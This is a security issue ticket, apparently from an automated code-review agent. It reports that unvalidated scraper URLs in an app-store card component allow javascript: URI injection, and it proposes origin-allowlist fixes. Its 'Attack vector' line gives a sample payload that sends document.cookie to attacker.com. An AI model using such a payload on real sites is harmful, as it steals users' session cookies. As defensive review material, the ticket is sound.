---
status: pending
priority: p1
issue_id: "001"
tags: [code-review, security, xss]
dependencies: []
---

# P1: Unvalidated scraper URL used as anchor `href` — javascript: URI injection risk

## Problem Statement

`data.storeUrl` comes verbatim from `raw.url` (scraper-returned) and is placed directly into `<a href={data.storeUrl}>` in `AppCard.tsx`. If the scraper ever returns a `javascript:` URI (via library bug, CDN compromise, or MITM on the scraper's outbound HTTP), clicking "View in App Store" would execute arbitrary JavaScript in the app's origin. `rel="noopener noreferrer"` does not prevent `javascript:` URI execution.

## Findings

- **`components/AppCard.tsx:152-159`** — `href={data.storeUrl}` with no validation
- **`lib/ios-store.ts:57`** — `storeUrl: raw.url` assigned without any URL check
- **`lib/android-store.ts:53`** — same pattern

**Attack vector:** Malicious or corrupted scraper response returning `{"url": "javascript:fetch('https://attacker.com/?c='+document.cookie)"}`. User clicks link → XSS executes in app origin.

## Proposed Solutions

### Option A: Validate in lib layer (Recommended)
Add a URL origin check in both lib mappers before assigning `storeUrl`:
```ts
function safeStoreUrl(url: string, allowedOrigins: string[]): string | null {
  try {
    const parsed = new URL(url);
    return parsed.protocol === "https:" && allowedOrigins.some(o => parsed.href.startsWith(o))
      ? url
      : null;
  } catch { return null; }
}
// In ios-store.ts mapper:
storeUrl: safeStoreUrl(raw.url, ["https://apps.apple.com", "https://itunes.apple.com"]) ?? "",
// In android-store.ts mapper:
storeUrl: safeStoreUrl(raw.url, ["https://play.google.com"]) ?? "",
```

Then in `AppCard.tsx`, only render the link if `data.storeUrl` is non-empty.

### Option B: Guard only at render time
In `AppCard.tsx`, check before rendering:
```tsx
const safeUrl = /^https:\/\/(apps\.apple\.com|play\.google\.com)/.test(data.storeUrl) ? data.storeUrl : null;
{safeUrl && <a href={safeUrl} ...>View in {label} →</a>}
```

**Recommended:** Option A (lib layer) + Option B (defense in depth).

## Acceptance Criteria
- [ ] `storeUrl` is validated against known-safe origins before being assigned in lib mappers
- [ ] `AppCard.tsx` renders the link only if `storeUrl` is non-empty/valid
- [ ] A `javascript:` URI from the scraper does not produce a rendered link
- [ ] Tests cover the validation logic

## Work Log
- 2026-02-21: Identified by security-sentinel agent in PR #1 review
